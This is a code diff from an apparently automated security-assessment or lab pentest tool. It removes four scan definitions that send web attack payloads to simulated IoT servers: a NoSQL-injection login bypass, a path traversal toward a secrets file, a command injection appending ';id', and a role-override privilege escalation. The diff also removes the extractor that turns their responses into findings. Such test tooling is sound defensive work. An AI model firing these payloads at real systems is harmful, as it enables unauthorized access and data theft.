@@ -166,43 +166,6 @@ ROLE_EXTRA_SCANS: dict[str, list[tuple[str, dict[str, Any]]]] = {
             "udp_scan": True,
         }),
     ],
-    "exploit_auth_server": [
-        ("http_request", {
-            "url": "http://{ip}:8080/login",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "body": "{\"username\":\"operator\",\"password\":{\"$ne\":null}}",
-            "follow_redirects": False,
-        }),
-    ],
-    "exploit_files_server": [
-        ("http_request", {
-            "url": "http://{ip}:8080/files?path=../../etc/device-secret",
-            "method": "GET",
-            "follow_redirects": False,
-        }),
-    ],
-    "exploit_command_server": [
-        ("http_request", {
-            "url": "http://{ip}:8080/diagnostics",
-            "method": "POST",
-            "headers": {"Content-Type": "application/json"},
-            "body": "{\"target\":\"127.0.0.1;id\"}",
-            "follow_redirects": False,
-        }),
-    ],
-    "exploit_privilege_server": [
-        ("http_request", {
-            "url": "http://{ip}:8080/jobs",
-            "method": "POST",
-            "headers": {
-                "Authorization": "Bearer low-privilege-s22",
-                "Content-Type": "application/json",
-            },
-            "body": "{\"role\":\"admin\",\"command\":\"status\"}",
-            "follow_redirects": False,
-        }),
-    ],
     # S15 uses bounded authenticated application probes. Keep the no-token
     # control beside the positive probes so generic HTTP 200 responses never
     # become authorization findings.
@@ -1629,40 +1592,6 @@ def _extract_ssh_port_forwarding(entries: list[dict], device: dict, svc_name: st
 
 
 # All extractors in order
-def _extract_exploit_primitive_findings(entries: list[dict], device: dict, svc_name: str) -> list[dict]:
-    """Extract only the four bounded positive S22 application probes."""
-    role = str(device.get("role") or "").casefold()
-    specs = {
-        "exploit_auth_server": ("POST", "/login", 200, "operator-token-s22", "broken_access_control", "HIGH", "Structured login value bypasses authentication"),
-        "exploit_files_server": ("GET", "/files", 200, "DEVICE-SECRET-S22", "data_exposure", "HIGH", "File API permits bounded path traversal"),
-        "exploit_command_server": ("POST", "/diagnostics", 200, "uid=1000(iotdiag)", "code_injection", "CRITICAL", "Diagnostics parameter permits simulated command injection"),
-        "exploit_privilege_server": ("POST", "/jobs", 201, "root-maintenance", "privilege_escalation", "CRITICAL", "Job API accepts an unauthorized privileged role override"),
-    }
-    spec = specs.get(role)
-    if spec is None:
-        return []
-    method, endpoint, expected_status, marker, vuln_type, severity, title = spec
-    for entry in entries:
-        if entry.get("tool") != "http_request":
-            continue
-        url = str(entry.get("kwargs", {}).get("url") or "")
-        if urlsplit(url).path != endpoint:
-            continue
-        result = _parse_result(entry)
-        status = result.get("status_code")
-        body = str(result.get("body") or "")
-        if status != expected_status or marker.casefold() not in body.casefold():
-            continue
-        return [_make_finding(
-            device, vuln_type, severity, "http", 8080,
-            title,
-            f"{method} {url} returned HTTP {status}; response marker: {marker}",
-            status="confirmed",
-            technique=f"Repeat the bounded {method} {endpoint} probe and preserve the response as evidence",
-            tools=["http_request"],
-            endpoint=endpoint,
-        )]
-
 def _extract_api_authorization_findings(
     entries: list[dict], device: dict, svc_name: str
 ) -> list[dict]:
@@ -2114,7 +2043,6 @@ def _extract_bacnet_disclosure(
 
 
 FINDING_EXTRACTORS = [
-    _extract_exploit_primitive_findings,
     _extract_api_authorization_findings,
     _extract_pki_findings,
     _extract_ota_findings,
